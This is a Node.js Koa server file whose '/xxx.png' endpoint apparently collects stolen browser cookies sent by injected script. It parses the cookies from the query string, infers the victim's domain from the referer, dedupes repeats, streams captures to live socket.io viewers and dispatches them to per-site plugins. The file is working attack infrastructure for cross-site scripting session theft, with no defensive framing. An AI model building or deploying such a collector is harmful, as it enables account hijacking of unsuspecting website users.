var koa = require('koa');
var router = require('koa-router');
var log4js = require('log4js');
var logger = log4js.getLogger('server');
var accessLogger = log4js.getLogger('access');
var socketIOLogger = log4js.getLogger('socket.io');
var dispatch = require('./dispatch');
var URL = require('url');
var tld = require('tldjs');
var _ = require('underscore');
var plugins = require('./plugins');
var path = require('path');
var socketio = require('socket.io');
var http = require('http');
var cookie = require('cookie');


var DEFAULTS = {
  plugins: path.normalize(__dirname + '/plugins')
};

logger.debug('DEFAULTS', DEFAULTS);

function serve (config) {
  config = config || {};
  if (config && _.isEmpty(config.plugins)) {
    delete config.plugins;
  }

  _.defaults(config, DEFAULTS);
  logger.debug('config: ' + JSON.stringify(config));

  var app = koa();


  app.use(function *(next) {

    var start = new Date;
    var req = this.request;
    var res = this.response;
    yield next;
    var ms = new Date - start;
    accessLogger.info(req.ip + ' ' + req.method + ' ' + req.url + ' ' + res.status + ' ' + ms + 'ms "' + req.header['user-agent'] + '"');
  });

  app.use(router(app));

  var requests = {};

  var ignoreTime = config.ignoreTime * 1000;
  if (ignoreTime == 0) {
    logger.info('Request will be processed every time');
  } else {
    logger.info('Same request will be ignored within ' + config.ignoreTime + ' seconds' );
  }

  plugins.loadPlugin(config.plugins);

  app.get('/xxx.png', function *() {

    var query = this.request.query;

    var result = {};

    result.cookies = query.cookie;
    result.referer = query.referer || this.request.header.referer;
    result.domain = query.domain;

    if (!result.cookies) {
      logger.info('no cookies in query, ignored')
      return;
    } else {
      result.cookiesData = cookie.parse(result.cookies, {decode: function (str) {return str;}}) || {};
    }

    if (!result.referer) {
      logger.warn('referer not found, ignored');
      return;
    } else {
      if (result.domain) {
        logger.info('both referer and domain are found, great')
      } else {
        var parsedUrl = URL.parse(result.referer);

        if (!parsedUrl.protocol || !parsedUrl.hostname) {
          logger.warn('invald referer ' + result.referer);
          return;
        }

        var host = parsedUrl.host;
        result.domain = tld.getDomain(host);
        logger.info('domain not found, set to ' + result.domain + ' according to referer ' + result.referer);
      }
    }


    var pluginName = result.domain;

    if (pluginName) {
      logger.debug('pluginName = ', pluginName)

      var key = pluginName + '/' + result.cookies;

      if (!requests[key]) {
        requests[key] = result;

        // reprocess request after exceeding the ignoreTime
        setTimeout(function() {
          delete requests[key];
        }, ignoreTime);

        socketIOLogger.info(result);

        process.nextTick(function () {
          dispatch(pluginName, result);
        });
      } else {
        logger.info('Same request recieved before, ignored');
      }

    } else {
      logger.warn('PluginName is blank, ignored');
    }

    this.body = 'done';

  });

  var server = http.createServer(app.callback());

  var io = socketio(server);

  log4js.addAppender(require('../lib/log4js-socket-io-appender').appender(io), 'socket.io');

  io.on('connection', function(socket){
    logger.trace('user connected');

    socket.on('disconnect', function(){
      logger.trace('user disconnected');
    });
  });

  server.listen(config.port);
  logger.info('Server is listening to port:' + config.port);
}

module.exports = {
  serve: serve
};